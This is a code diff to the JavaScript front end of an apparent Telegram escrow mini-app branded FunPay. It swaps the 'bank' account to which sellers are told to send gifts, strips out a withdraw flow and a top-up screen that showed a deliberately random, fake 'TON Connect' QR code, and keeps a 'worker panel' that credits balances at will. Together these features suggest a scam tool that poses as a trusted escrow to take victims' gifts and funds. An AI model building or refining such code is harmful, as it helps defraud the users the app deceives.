@@ -31,7 +31,7 @@ function safeConfirm(msg) {
 }
 
 // =====================================================
-// TOAST (зелёный и красный)
+// TOAST (зелёный / красный)
 // =====================================================
 function showToast(text, duration = 2000, type = "success") {
     let toast = document.getElementById("global-toast");
@@ -84,8 +84,7 @@ function showToast(text, duration = 2000, type = "success") {
 // =====================================================
 // API
 // =====================================================
-const API = "https://bot-1790950891-2117-soniloonov.bothost.tech";
-const DEFAULT_BOT_USERNAME = "Fun8Pay_bot";
+const API = "";
 
 function initData() {
     return tg?.initData || "";
@@ -159,8 +158,6 @@ let state = {
     details: {},
     currentWallet: "TON",
     workerCurrency: "RUB",
-    withdrawCurrency: "TON",
-    topupCurrency: "TON",
     flow: {
         role: null,
         currency: null,
@@ -182,7 +179,6 @@ function switchTab(tab) {
         el.classList.toggle("active", el.dataset.tab === tab);
     });
 
-    // BackButton: показываем только на вкладке "reviews"
     if (tg?.BackButton) {
         if (tab === "reviews") {
             tg.BackButton.show();
@@ -198,7 +194,7 @@ function switchTab(tab) {
     if (tab === "reviews") loadReviews();
 }
 
-// Telegram BackButton: из отзывов → на вкладку сделок
+// Telegram BackButton
 if (tg?.BackButton) {
     tg.BackButton.onClick(() => {
         const reviewsActive = document.getElementById("tab-reviews")?.classList.contains("active");
@@ -222,7 +218,6 @@ async function loadMe() {
             const el = document.getElementById("prof-name");
             if (el) el.textContent = tgUser.first_name || state.me.first_name;
         }
-
         if (state.me.bot_username) {
             window.__BOT_USERNAME__ = state.me.bot_username;
         }
@@ -426,7 +421,7 @@ function renderDealScreen(d) {
         if (d.is_creator) btnCancel.classList.remove("hidden");
     } else if (d.status === "paid") {
         if (d.is_seller) {
-            stepText = "Передайте подарок ТОЛЬКО в банк <b>@Gifts_Bankings</b> — никогда напрямую покупателю.";
+            stepText = "Передайте подарок ТОЛЬКО в банк <b>@FunPayVault</b> — никогда напрямую покупателю.";
             btnVault.classList.remove("hidden");
         } else {
             stepText = "Продавец передаёт подарок в банк. Ожидайте.";
@@ -501,13 +496,12 @@ async function dealReceive() {
 function dealShare() {
     const code = state.currentDealCode;
     if (!code) return;
-
-    const botUser = window.__BOT_USERNAME__
-        || state.me?.bot_username
-        || DEFAULT_BOT_USERNAME;
-
+    const botUser = window.__BOT_USERNAME__ || "";
+    if (!botUser) {
+        safeAlert("Не удалось получить юзернейм бота");
+        return;
+    }
     const link = `https://t.me/${botUser}?start=deal_${code}`;
-
     try {
         if (tg && typeof tg.openTelegramLink === "function") {
             const shareText = `Присоединяйся к сделке #${code}\n${link}`;
@@ -516,12 +510,11 @@ function dealShare() {
             return;
         }
     } catch (e) {}
-
     window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}`, "_blank");
 }
 
 function dealOpenVault() {
-    const url = "https://t.me/Gifts_Bankings";
+    const url = "https://t.me/FunPayVault";
     try {
         if (tg && typeof tg.openTelegramLink === "function") {
             tg.openTelegramLink(url);
@@ -718,221 +711,6 @@ async function saveDetails() {
         console.error("saveDetails error", e);
         showToast("Ошибка сохранения", 2000, "error");
     }
-}
-
-// =====================================================
-// WITHDRAW (ВЫВОД)
-// =====================================================
-const WITHDRAW_META = {
-    TON:   { label: "Вывести TON",     placeholder: "1.00",  min: 1,    field: "ton",   hint: "TON зачислится на TON-баланс получателя в Telegram." },
-    USDT:  { label: "Вывести USDT",    placeholder: "10.00", min: 10,   field: "usdt",  hint: "USDT зачислится на USDT-кошелёк (TRC20)." },
-    STARS: { label: "Вывести STARS",   placeholder: "50",    min: 50,   field: "stars", hint: "Stars зачислятся на @username получателя." },
-    RUB:   { label: "Вывести RUB",     placeholder: "1000",  min: 1000, field: "card",  hint: "RUB зачислятся на карту получателя." },
-    KZT:   { label: "Вывести KZT",     placeholder: "1000",  min: 1000, field: "card",  hint: "KZT зачислятся на карту получателя." },
-    UAH:   { label: "Вывести UAH",     placeholder: "1000",  min: 1000, field: "card",  hint: "UAH зачислятся на карту получателя." },
-    USD:   { label: "Вывести USD",     placeholder: "10",    min: 10,   field: "card",  hint: "USD зачислятся на карту получателя." },
-    BTC:   { label: "Вывести BTC",     placeholder: "0.001", min: 0.001, field: "btc",  hint: "BTC зачислится на BTC-кошелёк." },
-};
-
-function openWithdrawModal(currency = "TON") {
-    const dealsCount = state.me?.deals_count ?? 0;
-
-    if (dealsCount < 1) {
-        showToast("Вывод доступен от 1 сделки", 2500, "error");
-        return;
-    }
-    if (dealsCount < 2) {
-        showToast("Вывод доступен от 2 сделок", 2500, "error");
-        return;
-    }
-
-    state.withdrawCurrency = currency;
-    renderWithdrawCurrencyGrid();
-    renderWithdrawForm();
-
-    document.getElementById("modal-withdraw").classList.remove("hidden");
-}
-
-function closeWithdrawModal() {
-    document.getElementById("modal-withdraw").classList.add("hidden");
-}
-
-function renderWithdrawCurrencyGrid() {
-    const grid = document.getElementById("withdraw-currency-grid");
-    if (!grid) return;
-    grid.innerHTML = CURRENCIES.map(c => `
-        <div class="cur-card ${state.withdrawCurrency === c.code ? 'selected' : ''}" onclick="chooseWithdrawCurrency('${c.code}')">
-            ${currencyIconHTML(c.code, "circle", 32)}
-            <div>${c.name}</div>
-        </div>
-    `).join("");
-}
-
-function chooseWithdrawCurrency(code) {
-    state.withdrawCurrency = code;
-    renderWithdrawCurrencyGrid();
-    renderWithdrawForm();
-}
-
-function renderWithdrawForm() {
-    const cur = state.withdrawCurrency;
-    const meta = WITHDRAW_META[cur];
-    if (!meta) return;
-
-    const labelEl = document.getElementById("withdraw-label");
-    if (labelEl) labelEl.textContent = meta.label;
-
-    const hintEl = document.getElementById("withdraw-hint");
-    if (hintEl) hintEl.textContent = meta.hint;
-
-    const amountInput = document.getElementById("withdraw-amount");
-    if (amountInput) {
-        amountInput.placeholder = meta.placeholder;
-        amountInput.value = "";
-    }
-
-    const balance = state.me?.balance ?? 0;
-    const amountEl = document.getElementById("withdraw-available");
-    if (amountEl) amountEl.textContent = `${balance.toFixed(0)} ${cur === "STARS" ? "STARS" : cur}`;
-
-    const recipientEl = document.getElementById("withdraw-recipient");
-    if (recipientEl) {
-        const username = state.me?.username ? `@${state.me.username}` : (state.me?.first_name || "Вы");
-        recipientEl.textContent = username;
-    }
-
-    const minEl = document.getElementById("withdraw-min");
-    if (minEl) minEl.textContent = `Минимум: ${meta.min} ${cur === "STARS" ? "STARS" : cur}`;
-}
-
-async function submitWithdraw() {
-    const cur = state.withdrawCurrency;
-    const meta = WITHDRAW_META[cur];
-    const amountInput = document.getElementById("withdraw-amount");
-    const amount = parseFloat(amountInput.value);
-
-    if (!amount || amount <= 0) {
-        showToast("Введите сумму больше 0", 2000, "error");
-        return;
-    }
-    if (amount < meta.min) {
-        showToast(`Минимум: ${meta.min} ${cur}`, 2000, "error");
-        return;
-    }
-
-    try {
-        await api("/api/withdraw", {
-            method: "POST",
-            body: { amount, currency: cur },
-        });
-        closeWithdrawModal();
-        showToast(`Заявка на вывод ${amount} ${cur === "STARS" ? "STARS" : cur} отправлена. Ожидайте обработки.`, 3000);
-    } catch (e) {
-        console.error("withdraw error", e);
-        showToast(e.message || "Ошибка вывода", 2500, "error");
-    }
-}
-
-// =====================================================
-// TOPUP (ПОПОЛНЕНИЕ) + TON CONNECT QR
-// =====================================================
-const TOPUP_META = {
-    TON:   { label: "Пополнить TON",   placeholder: "10",    min: 1,   symbol: "TON" },
-    USDT:  { label: "Пополнить USDT",  placeholder: "10",    min: 1,   symbol: "USDT" },
-    STARS: { label: "Пополнить STARS", placeholder: "100",   min: 50,  symbol: "STARS" },
-    RUB:   { label: "Пополнить RUB",   placeholder: "1000",  min: 100, symbol: "RUB" },
-    KZT:   { label: "Пополнить KZT",   placeholder: "1000",  min: 100, symbol: "KZT" },
-    UAH:   { label: "Пополнить UAH",   placeholder: "1000",  min: 100, symbol: "UAH" },
-    USD:   { label: "Пополнить USD",   placeholder: "10",    min: 1,   symbol: "USD" },
-    BTC:   { label: "Пополнить BTC",   placeholder: "0.01",  min: 0.001, symbol: "BTC" },
-    ETH:   { label: "Пополнить ETH",   placeholder: "0.1",   min: 0.01, symbol: "ETH" },
-};
-
-function openTopupModal(currency = "TON") {
-    state.topupCurrency = currency;
-    const meta = TOPUP_META[currency] || TOPUP_META.TON;
-
-    const label = document.getElementById("topup-label");
-    if (label) label.textContent = meta.label;
-
-    const amountLabel = document.getElementById("topup-amount-label");
-    if (amountLabel) amountLabel.textContent = `Сумма ${meta.symbol}`;
-
-    const amountInput = document.getElementById("topup-amount");
-    if (amountInput) {
-        amountInput.placeholder = meta.placeholder;
-        amountInput.value = "";
-    }
-
-    const minEl = document.getElementById("topup-min");
-    if (minEl) minEl.textContent = `Минимум: ${meta.min} ${meta.symbol}`;
-
-    document.getElementById("modal-topup").classList.remove("hidden");
-}
-
-function closeTopupModal() {
-    document.getElementById("modal-topup").classList.add("hidden");
-}
-
-function submitTopup() {
-    const cur = state.topupCurrency;
-    const meta = TOPUP_META[cur] || TOPUP_META.TON;
-    const amountInput = document.getElementById("topup-amount");
-    const amount = parseFloat(amountInput?.value);
-
-    if (!amount || amount <= 0) {
-        showToast("Введите сумму больше 0", 2000, "error");
-        return;
-    }
-    if (amount < meta.min) {
-        showToast(`Минимум: ${meta.min} ${meta.symbol}`, 2000, "error");
-        return;
-    }
-
-    // закрываем окно суммы и открываем QR
-    closeTopupModal();
-    openTonConnect(amount, cur);
-}
-
-// =====================================================
-// TON CONNECT (QR) — БЕЗ ССЫЛОК, СЛУЧАЙНЫЙ QR
-// =====================================================
-function randomQrData() {
-    // Случайная строка (не ссылка)
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    let s = "TONPAY-";
-    for (let i = 0; i < 28; i++) {
-        s += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return s;
-}
-
-function openTonConnect(amount, currency) {
-    const modal = document.getElementById("modal-ton-connect");
-    if (!modal) return;
-
-    // Генерируем случайный QR (картинка через публичный генератор —
-    // но БЕЗ ссылки в QR, только случайный текст)
-    const qrData = randomQrData();
-    const qrImg = document.getElementById("tc-qr-img");
-    if (qrImg) {
-        qrImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data="
-            + encodeURIComponent(qrData);
-        qrImg.alt = "QR";
-        // на всякий случай убираем возможные ссылки
-        qrImg.onclick = (e) => e.preventDefault();
-        qrImg.style.cursor = "default";
-    }
-
-    modal.classList.remove("hidden");
-}
-
-function closeTonConnect() {
-    document.getElementById("modal-ton-connect").classList.add("hidden");
-}
-
-function tcNoop() {
-    // Ничего не делаем — по требованию
 }
 
 // =====================================================
@@ -1159,7 +937,7 @@ async function setLang(lang) {
 }
 
 // =====================================================
-// WORKER PANEL
+// WORKER PANEL — ПОПОЛНЕНИЕ С ВЫБОРОМ ВАЛЮТЫ
 // =====================================================
 function openWorkerBalance() {
     state.workerCurrency = "RUB";
@@ -1191,7 +969,7 @@ function chooseWorkerCurrency(code) {
 async function submitWorkerBalance() {
     const amount = parseFloat(document.getElementById("worker-balance-amount").value);
     if (!amount || amount <= 0) {
-        safeAlert("Введите сумму больше 0");
+        showToast("Введите сумму больше 0", 2000, "error");
         return;
     }
     try {
@@ -1199,13 +977,13 @@ async function submitWorkerBalance() {
             method: "POST",
             body: { amount, currency: state.workerCurrency },
         });
-        safeAlert(`Баланс пополнен на ${amount} ${state.workerCurrency}\nТекущий баланс: ${res.new_balance.toFixed(2)} RUB`);
         closeWorkerBalance();
+        showToast(`Баланс пополнен на ${amount} ${state.workerCurrency}`, 2500, "success");
         await loadMe();
         await loadWorkerStats();
         renderBalances();
     } catch (e) {
-        safeAlert(e.message || "Ошибка");
+        showToast(e.message || "Ошибка пополнения", 2500, "error");
     }
 }
 
